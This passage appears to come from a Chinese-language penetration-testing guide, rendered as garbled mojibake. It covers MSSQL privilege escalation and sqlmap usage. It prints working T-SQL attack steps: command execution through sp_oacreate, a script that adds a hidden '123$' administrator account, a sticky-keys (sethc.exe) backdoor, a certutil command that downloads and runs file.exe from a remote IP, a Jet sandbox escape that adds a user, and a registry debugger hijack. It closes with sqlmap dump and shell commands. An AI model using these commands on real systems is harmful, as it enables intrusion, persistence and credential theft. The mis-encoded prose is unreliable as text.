é€šè¿‡ä¸‹è½½æ–‡ä»¶ä¹‹åç”¨xp_cmdshellæ¥æ‰§è¡Œæˆ‘ä»¬çš„payloadï¼Œé€šè¿‡Cobalt Strikeæ¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œæ¯”å¦‚æ€¼expæˆ–è®¸ä¼šæ›´åŠ æ–¹ä¾¿ã€‚

##### sp_oacreate

å½“xp_cmdshell è¢«åˆ é™¤å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¥ææƒè¯•è¯•,æ¢å¤sp_oacreate

```
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'Ole Automation Procedures', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'show advanced options', 0;
```



sp_oacreateæ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„å­˜å‚¨è¿‡ç¨‹å¯ä»¥åˆ é™¤ã€å¤åˆ¶ã€ç§»åŠ¨æ–‡ä»¶ è¿˜èƒ½é…åˆsp_oamethod æ¥å†™æ–‡ä»¶æ‰§è¡Œcmd

åœ¨ä»¥å‰çš„ç³»ç»Ÿæœ‰è¿™å‡ ç§ç”¨æ³•

1. è°ƒç”¨cmd æ¥æ‰§è¡Œå‘½ä»¤

```
wscript.shellæ‰§è¡Œå‘½ä»¤

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c xxx'



Shell.Applicationæ‰§è¡Œå‘½ä»¤
declare @o int
exec sp_oacreate 'Shell.Application', @o out
exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user >c:\test.txt','c:\windows\system32','','1';
```



1. å†™å…¥å¯åŠ¨é¡¹

```
declare @sp_passwordxieo int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out
exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'd:\RECYCLER\1.vbs', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.ComputerName'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&"/Administrators,group")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create("user","123$")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "123"'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&"/123$",user)'
exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/123$"';
```



1. ç²˜è´´é”®æ›¿æ¢

```
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
```



å¤§å®¶å¯ä»¥çµæ´»è¿ç”¨ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥è¿™æ ·ç©ï¼ŒæŠŠä»–å†™æˆvbsæˆ–è€…å…¶ä»–çš„æ¥ä¸‹è½½æ–‡ä»¶ ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥è°ƒç”¨cmdæ¥ä¸‹è½½ï¼Œå†2008ç³»ç»Ÿä¸Šæˆ‘æ˜¯ä¸æˆåŠŸçš„ï¼Œä½†æ˜¯sp_oacreateå¯ä»¥å¯åŠ¨è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ¢ä¸ªæ€è·¯

```
declare @sp_passwordxieo int, @f int, @t int, @ret int;
exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out;
exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'c:\www\1.bat', 1;
exec @ret = sp_oamethod @f, 'writeline', NULL,'@echo off';
exec @ret = sp_oamethod @f, 'writeline', NULL,'start cmd /k "cd c:\www & certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe"';


declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\www\1.bat'

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\www\file.exe'
```



å½“ç„¶è¿™é‡Œåªæ˜¯ä¸€ç§æ€è·¯ï¼Œä½ å®Œå…¨å¯ä»¥ç”¨vbsæ¥ä¸‹è½½ä»€ä¹ˆçš„

##### æ²™ç›’ææƒ

```mssql
1. exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;

2. exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

3. Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Databasec:\windows\system32\ias\ias.mdb','select shell( net user itpro gmasfm /add )');
```

å¼•ç”¨å‰è¾ˆä»¬çš„è¯

> 1ï¼ŒAccesså¯ä»¥è°ƒç”¨VBSçš„å‡½æ•°ï¼Œä»¥Systemæƒé™æ‰§è¡Œä»»æ„å‘½ä»¤
> 2ï¼ŒAccessæ‰§è¡Œè¿™ä¸ªå‘½ä»¤æ˜¯æœ‰æ¡ä»¶çš„ï¼Œéœ€è¦ä¸€ä¸ªå¼€å…³è¢«æ‰“å¼€
> 3ï¼Œè¿™ä¸ªå¼€å…³åœ¨æ³¨å†Œè¡¨é‡Œ
> 4ï¼ŒSAæ˜¯æœ‰æƒé™å†™æ³¨å†Œè¡¨çš„
> 5ï¼Œç”¨SAå†™æ³¨å†Œè¡¨çš„æƒé™æ‰“å¼€é‚£ä¸ªå¼€å…³
> 6ï¼Œè°ƒç”¨Accessé‡Œçš„æ‰§è¡Œå‘½ä»¤æ–¹æ³•ï¼Œä»¥systemæƒé™æ‰§è¡Œä»»æ„å‘½ä»¤æ‰§è¡ŒSQLå‘½ä»¤ï¼Œæ‰§è¡Œäº†ä»¥ä¸‹å‘½ä»¤

##### xp_regwrite

ä¿®æ”¹æ³¨å†Œè¡¨ æ¥åŠ«æŒç²˜è´´é”® å½“ç„¶åœ¨2008æ•°æ®åº“æ˜¯ä¸æˆç«‹çš„ å› ä¸ºé»˜è®¤æƒé™å¾ˆä½

```
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution
Options\sethc.EXE','Debugger','REG_SZ','C:\WINDOWS\explorer.exe';
```



mssqlä¼—å¤šçš„å‚¨å­˜è¿‡ç¨‹æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„å…³é”®ï¼Œè¿˜æœ‰å¾ˆå¤šå¯èƒ½æ²¡è¢«æå‡ºï¼Œéœ€è¦è‡ªå·±çš„å‘ç°ï¼Œæ¯”å¦‚åœ¨é‡åˆ°iis6çš„æ‹¿ä¸äº†shellè¿˜æœ‰ä¸ªä¸Šä¼ å¯ä»¥è·³ç›®å½•ï¼Œä¸å¦¨è¯•è¯•xp_create_subdirå»ºç«‹ä¸ªç•¸å½¢ç›®å½•è§£æã€‚







## **å·¥å…·ä½¿ç”¨**



### sqlmap

å‚è€ƒ:https://blog.csdn.net/qq_33530840/article/details/82144515

#### **sqlmapè¯¦ç»†å‘½ä»¤å‚æ•°**

- â€“is-dba å½“å‰ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ä¸ºrootæƒé™ï¼‰
- â€“dbs æ‰€æœ‰æ•°æ®åº“
- â€“current-db ç½‘ç«™å½“å‰æ•°æ®åº“
- â€“users æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·
- â€“current-user å½“å‰æ•°æ®åº“ç”¨æˆ·
- â€“random-agent æ„é€ éšæœºuser-agent
- â€“passwords æ•°æ®åº“å¯†ç 
- â€“proxy http://local:8080 â€“threads 10 (å¯ä»¥è‡ªå®šä¹‰çº¿ç¨‹åŠ é€Ÿ) ä»£ç†
- â€“time-sec=TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰

â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

**Optionsï¼ˆé€‰é¡¹ï¼‰ï¼š**

- â€“version æ˜¾ç¤ºç¨‹åºçš„ç‰ˆæœ¬å·å¹¶é€€å‡º
- -h, â€“help æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º
- -v VERBOSE è¯¦ç»†çº§åˆ«ï¼š0-6ï¼ˆé»˜è®¤ä¸º1ï¼‰
- ä¿å­˜è¿›åº¦ç»§ç»­è·‘ï¼š

sqlmap -u â€œhttp://url/news?id=1â€œ â€“dbs-o â€œsqlmap.logâ€ ä¿å­˜è¿›åº¦
sqlmap -u â€œhttp://url/news?id=1â€œ â€“dbs-o â€œsqlmap.logâ€ â€“resume æ¢å¤å·²ä¿å­˜è¿›åº¦

**Targetï¼ˆç›®æ ‡ï¼‰ï¼š**

ä»¥ä¸‹è‡³å°‘éœ€è¦è®¾ç½®å…¶ä¸­ä¸€ä¸ªé€‰é¡¹ï¼Œè®¾ç½®ç›®æ ‡URLã€‚

- -d DIRECT ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“ã€‚
- -u URL, â€“url=URL ç›®æ ‡URLã€‚
- -l LIST ä»Burpæˆ–WebScarabä»£ç†çš„æ—¥å¿—ä¸­è§£æç›®æ ‡ã€‚
- -r REQUESTFILE ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è½½å…¥HTTPè¯·æ±‚ã€‚
- -g GOOGLEDORK å¤„ç†Google dorkçš„ç»“æœä½œä¸ºç›®æ ‡URLã€‚
- -c CONFIGFILE ä»INIé…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ã€‚

**Requestï¼ˆè¯·æ±‚ï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URLã€‚

- â€“data=DATA é€šè¿‡POSTå‘é€çš„æ•°æ®å­—ç¬¦ä¸²
- â€“cookie=COOKIE HTTP Cookieå¤´
- â€“cookie-urlencode URL ç¼–ç ç”Ÿæˆçš„cookieæ³¨å…¥
- â€“drop-set-cookie å¿½ç•¥å“åº”çš„Set â€“ Cookieå¤´ä¿¡æ¯
- â€“user-agent=AGENT æŒ‡å®š HTTP User â€“ Agentå¤´
- â€“random-agent ä½¿ç”¨éšæœºé€‰å®šçš„HTTP User â€“ Agentå¤´
- â€“referer=REFERER æŒ‡å®š HTTP Refererå¤´
- â€“headers=HEADERS æ¢è¡Œåˆ†å¼€ï¼ŒåŠ å…¥å…¶ä»–çš„HTTPå¤´
- â€“auth-type=ATYPE HTTPèº«ä»½éªŒè¯ç±»å‹ï¼ˆåŸºæœ¬ï¼Œæ‘˜è¦æˆ–NTLMï¼‰(Basic, Digest or NTLM)
- â€“auth-cred=ACRED HTTPèº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·å:å¯†ç ï¼‰
- â€“auth-cert=ACERT HTTPè®¤è¯è¯ä¹¦ï¼ˆkey_fileï¼Œcert_fileï¼‰
- â€“proxy=PROXY ä½¿ç”¨HTTPä»£ç†è¿æ¥åˆ°ç›®æ ‡URL
- â€“proxy-cred=PCRED HTTPä»£ç†èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰
- â€“ignore-proxy å¿½ç•¥ç³»ç»Ÿé»˜è®¤çš„HTTPä»£ç†
- â€“delay=DELAY åœ¨æ¯ä¸ªHTTPè¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½ä¸ºç§’
- â€“timeout=TIMEOUT ç­‰å¾…è¿æ¥è¶…æ—¶çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º30ç§’ï¼‰
- â€“retries=RETRIES è¿æ¥è¶…æ—¶åé‡æ–°è¿æ¥çš„æ—¶é—´ï¼ˆé»˜è®¤3ï¼‰
- â€“scope=SCOPE ä»æ‰€æä¾›çš„ä»£ç†æ—¥å¿—ä¸­è¿‡æ»¤å™¨ç›®æ ‡çš„æ­£åˆ™è¡¨è¾¾å¼
- â€“safe-url=SAFURL åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸è®¿é—®çš„urlåœ°å€
- â€“safe-freq=SAFREQ ä¸¤æ¬¡è®¿é—®ä¹‹é—´æµ‹è¯•è¯·æ±‚ï¼Œç»™å‡ºå®‰å…¨çš„URL

**Enumerationï¼ˆæšä¸¾ï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ—ä¸¾åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¿¡æ¯ã€è¡¨ä¸­çš„ç»“æ„å’Œæ•°æ®ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥è¿è¡Œ
æ‚¨è‡ªå·±çš„SQLè¯­å¥ã€‚

- -b, â€“banner æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†
- â€“current-user æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·
- â€“current-db æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“
- â€“is-dba æ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBA
- â€“users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·
- â€“passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ
- â€“privileges æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™
- â€“roles æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²
- â€“dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“
- -D DBname è¦è¿›è¡Œæšä¸¾çš„æŒ‡å®šæ•°æ®åº“å
- -T TBLname è¦è¿›è¡Œæšä¸¾çš„æŒ‡å®šæ•°æ®åº“è¡¨ï¼ˆå¦‚ï¼š-T tablename â€“columnsï¼‰
- â€“tables æšä¸¾çš„DBMSæ•°æ®åº“ä¸­çš„è¡¨
- â€“columns æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—
- â€“dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹
- â€“dump-all è½¬å‚¨æ‰€æœ‰çš„DBMSæ•°æ®åº“è¡¨ä¸­çš„æ¡ç›®
- â€“search æœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ/æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰
- -C COL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ—
- -U USER ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·
- â€“exclude-sysdbs æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“
- â€“start=LIMITSTART ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿›å…¥æ£€ç´¢
- â€“stop=LIMITSTOP æœ€åæŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥æ£€ç´¢
- â€“first=FIRSTCHAR ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦æ£€ç´¢
- â€“last=LASTCHAR æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦æ£€ç´¢
- â€“sql-query=QUERY è¦æ‰§è¡Œçš„SQLè¯­å¥
- â€“sql-shell æç¤ºäº¤äº’å¼SQLçš„shell

**Optimizationï¼ˆä¼˜åŒ–ï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ç”¨äºä¼˜åŒ–SqlMapçš„æ€§èƒ½ã€‚

- -o å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³
- â€“predict-output é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡º
- â€“keep-alive ä½¿ç”¨æŒä¹…çš„HTTPï¼ˆSï¼‰è¿æ¥
- â€“null-connection ä»æ²¡æœ‰å®é™…çš„HTTPå“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦
- â€“threads=THREADS æœ€å¤§çš„HTTPï¼ˆSï¼‰è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º1ï¼‰

**Injectionï¼ˆæ³¨å…¥ï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œ æä¾›è‡ªå®šä¹‰çš„æ³¨å…¥payloadså’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚

- -p TESTPARAMETER å¯æµ‹è¯•çš„å‚æ•°ï¼ˆSï¼‰
- â€“dbms=DBMS å¼ºåˆ¶åç«¯çš„DBMSä¸ºæ­¤å€¼
- â€“os=OS å¼ºåˆ¶åç«¯çš„DBMSæ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼
- â€“prefix=PREFIX æ³¨å…¥payloadå­—ç¬¦ä¸²å‰ç¼€
- â€“suffix=SUFFIX æ³¨å…¥payloadå­—ç¬¦ä¸²åç¼€
- â€“tamper=TAMPER ä½¿ç”¨ç»™å®šçš„è„šæœ¬ï¼ˆSï¼‰ç¯¡æ”¹æ³¨å…¥æ•°æ®

**Detectionï¼ˆæ£€æµ‹ï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šåœ¨SQLç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒHTTPå“åº”é¡µé¢çš„å†…å®¹ã€‚

- â€“level=LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰
- â€“risk=RISK æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰
- â€“string=STRING æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸²
- â€“regexp=REGEXP æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼
- â€“text-only ä»…åŸºäºåœ¨æ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µ

**Techniquesï¼ˆæŠ€å·§ï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ç”¨äºè°ƒæ•´å…·ä½“çš„SQLæ³¨å…¥æµ‹è¯•ã€‚

- â€“technique=TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤BEUSTï¼‰
- â€“time-sec=TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰
- â€“union-cols=UCOLS å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯•UNIONæŸ¥è¯¢æ³¨å…¥
- â€“union-char=UCHAR ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦

**Fingerprintï¼ˆæŒ‡çº¹ï¼‰ï¼š**

- -f, â€“fingerprint æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„DBMSç‰ˆæœ¬æŒ‡çº¹

**Brute forceï¼ˆè›®åŠ›ï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥ã€‚

- â€“common-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨
- â€“common-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ—

User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰ï¼š
è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚

â€“udf-inject æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°
â€“shared-lib=SHLIB å…±äº«åº“çš„æœ¬åœ°è·¯å¾„

**File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚

- â€“file-read=RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶
- â€“file-write=WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶
- â€“file-dest=DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„

**Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰ï¼š**

è¿™äº›é€‰é¡¹å¯ä»¥ç”¨äºè®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ“ä½œç³»ç»Ÿã€‚

- â€“os-cmd=OSCMD æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤
- â€“os-shell äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿçš„shell
- â€“os-pwn è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNC
- â€“os-smbrelay ä¸€é”®è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNC
- â€“os-bof å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨
- â€“priv-esc æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·æƒé™æå‡
- â€“msf-path=MSFPATH Metasploit Frameworkæœ¬åœ°çš„å®‰è£…è·¯å¾„
- â€“tmp-path=TMPPATH è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„

**Windowsæ³¨å†Œè¡¨è®¿é—®ï¼š**

è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»ŸWindowsæ³¨å†Œè¡¨ã€‚

- â€“reg-read è¯»ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼
- â€“reg-add å†™ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼æ•°æ®
- â€“reg-del åˆ é™¤Windowsæ³¨å†Œè¡¨é”®å€¼
- â€“reg-key=REGKEY Windowsæ³¨å†Œè¡¨é”®
- â€“reg-value=REGVAL Windowsæ³¨å†Œè¡¨é¡¹å€¼
- â€“reg-data=REGDATA Windowsæ³¨å†Œè¡¨é”®å€¼æ•°æ®
- â€“reg-type=REGTYPE Windowsæ³¨å†Œè¡¨é¡¹å€¼ç±»å‹

è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€äº›ä¸€èˆ¬çš„å·¥ä½œå‚æ•°ã€‚

- -t TRAFFICFILE è®°å½•æ‰€æœ‰HTTPæµé‡åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­
- -s SESSIONFILE ä¿å­˜å’Œæ¢å¤æ£€ç´¢ä¼šè¯æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®
- â€“flush-session åˆ·æ–°å½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶
- â€“fresh-queries å¿½ç•¥åœ¨ä¼šè¯æ–‡ä»¶ä¸­å­˜å‚¨çš„æŸ¥è¯¢ç»“æœ
- â€“eta æ˜¾ç¤ºæ¯ä¸ªè¾“å‡ºçš„é¢„è®¡åˆ°è¾¾æ—¶é—´
- â€“update æ›´æ–°SqlMap
- â€“save fileä¿å­˜é€‰é¡¹åˆ°INIé…ç½®æ–‡ä»¶
- â€“batch ä»ä¸è¯¢é—®ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨æ‰€æœ‰é»˜è®¤é…ç½®ã€‚

**Miscellaneousï¼ˆæ‚é¡¹ï¼‰ï¼š**

- â€“beep å‘ç°SQLæ³¨å…¥æ—¶æé†’
- â€“check-payload IDSå¯¹æ³¨å…¥payloadsçš„æ£€æµ‹æµ‹è¯•
- â€“cleanup SqlMapå…·ä½“çš„UDFå’Œè¡¨æ¸…ç†DBMS
- â€“forms å¯¹ç›®æ ‡URLçš„è§£æå’Œæµ‹è¯•å½¢å¼
- â€“gpage=GOOGLEPAGE ä»æŒ‡å®šçš„é¡µç ä½¿ç”¨è°·æ­Œdorkç»“æœ
- â€“page-rank Google dorkç»“æœæ˜¾ç¤ºç½‘é¡µæ’åï¼ˆPRï¼‰
- â€“parse-errors ä»å“åº”é¡µé¢è§£ææ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„é”™è¯¯æ¶ˆæ¯
- â€“replicate å¤åˆ¶è½¬å‚¨çš„æ•°æ®åˆ°ä¸€ä¸ªsqlite3æ•°æ®åº“
- â€“tor ä½¿ç”¨é»˜è®¤çš„Torï¼ˆVidalia/ Privoxy/ Polipoï¼‰ä»£ç†åœ°å€
- â€“wizard ç»™åˆçº§ç”¨æˆ·çš„ç®€å•å‘å¯¼ç•Œé¢

#### sqlmapä½¿ç”¨

**ä½¿ç”¨ä»£ç†**

å¯ä»¥é…åˆä»£ç†æ± ,æˆ‘ä¹‹å‰æœ‰å‘è¿‡

```
sqlmap -u â€œhttp://www.vuln.cn/post.php?id=1â€ --proxy â€œhttp://127.0.0.1:1080â€³
```

**æ£€æµ‹æ³¨å…¥**

```
sqlmap -u â€œhttp://www.vuln.cn/post.php?id=1â€
```

**cookieæ³¨å…¥**

åªæœ‰levelè¾¾åˆ°2æ‰ä¼šæ£€æµ‹cookie

```
sqlmap -u â€œhttp://www.vuln.cnâ€ â€“cookie â€œid=11â€ --level 2
```

**æ•°æ®åŒ…æ³¨å…¥**

```
sqlmap -r â€œc:\tools\request.txtâ€ 
```

**postæ³¨å…¥**

```
sqlmap -u "http://www.vuln.cn/post.php?id=1" --method POST --data "id=1"
```

**ä¼ªé™æ€æ³¨å…¥**

å› ä¸º+å·ä¼šè¢«urlç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šå¸¸ä½¿ç”¨å‡å·æ¥è¿›è¡Œåˆ¤æ–­ã€‚

```
http://www.xxxx.com/product/detail/id/3-1.html
```

æ³¨å…¥çš„åœ°æ–¹ç”¨*å·

```
sqlmap.py -u www.xxxx.com/product/detail/id/3*.html --dbms=mysql -v 3 
```

**è·‘åº“**

--dbmsæŒ‡å®šæ•°æ®åº“

--dbsåˆ—å‡ºå…¨éƒ¨æ•°æ®åº“

```
sqlmap -u â€œhttp://www.vuln.cn/post.php?id=1â€  --dbms mysql  --dbs
```

**è·‘è¡¨**

-DæŒ‡å®šæ•°æ®åº“(test)

--tablesåˆ—å‡ºè¯¥åº“å…¨éƒ¨è¡¨

```
sqlmap -u â€œhttp://www.vuln.cn/post.php?id=1â€  --dbms mysql  -D test --tables
```

**è·‘åˆ—å**

-TæŒ‡å®šè¡¨(admin)

--columnsåˆ—å‡ºè¯¥è¡¨å…¨éƒ¨åˆ—å

```
sqlmap -u â€œhttp://www.vuln.cn/post.php?id=1â€  --dbms mysql  -D test -T admin â€“-columns
```

**è·‘æ•°æ®**

-CæŒ‡å®šåˆ—å

--dumpè·‘å…¨éƒ¨æ•°æ®

--start 1 --stop 10 è·‘åæ¡æ•°æ®

```
sqlmap -u â€œhttp://www.vuln.cn/post.php?id=1â€  --dbms mysql -D test -T admin -C â€œusername,passwordâ€ --dump
```

**åˆ¤æ–­æ˜¯å¦æ˜¯ç®¡ç†å‘˜**

```
sqlmap -u â€œhttp://www.vuln.cn/post.php?id=1â€  --dbms mysql --is-dba
```

**sqlshell**

è·å–ä¸€ä¸ªsqlshell,å¯ä»¥ç”¨æ¥æ‰§è¡Œsqlè¯­å¥

```
sqlmap -u â€œhttp://www.vuln.cn/post.php?id=1â€ --sql-shell
```

**ç”¨searchå‚æ•°å¿«é€Ÿå®šä½passwordåˆ—**

```
sqlmap -r â€œc:\tools\request.txtâ€ â€“dbms mysql -D test â€“search -C admin,password
```

**è·å–shell**

æ¡ä»¶:

**ï¼ˆ1ï¼‰ç½‘ç«™å¿…é¡»æ˜¯rootæƒé™**

**ï¼ˆ2ï¼‰æ”»å‡»è€…éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„**

